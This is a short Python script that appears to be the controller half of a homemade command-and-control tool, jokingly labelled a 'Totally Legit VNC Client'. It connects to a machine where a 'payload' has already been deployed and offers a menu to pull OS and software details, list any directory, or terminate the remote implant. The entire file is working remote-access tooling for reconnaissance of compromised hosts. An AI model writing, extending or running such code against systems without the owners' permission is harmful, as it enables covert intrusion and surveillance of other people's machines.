import socket

print("Totally Legit VNC Client... ~Not a C2 Indeed!~")

target = input("Ensure payload is deployed.\nEnter server to connect to: ")
port = 13337
def printmenu():
    menu = [
        "[OPTION 1] View OS and Software Info",
        "[OPTION 2] List Directory Contents",
        "[OPTION 3] Terminate Server (Requires Reconnection)"
    ]
    for item in menu:
        print(item)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))

print("Connection established successfully...")
printmenu()
while True:
    prompt = input("Select an option: ")

    if prompt == "1":
        s.sendall(prompt.encode())
        data = s.recv(1024)
        if not data:
            break
        print(data.decode('utf-8'))

    elif prompt == "2":
        path = input("Insert path to list: ")
        s.sendall(prompt.encode())
        s.sendall(path.encode("utf-8"))
        data = s.recv(1024)
        data = data.decode("utf-8").split(",")
        print("=" * 40)
        for f in data:
            print(f)
        print("=" * 40)

    elif prompt == "3":
        s.sendall(prompt.encode())
        s.close()
        break
    else:
        print("Invalid option. Try Again!\n")

    printmenu()
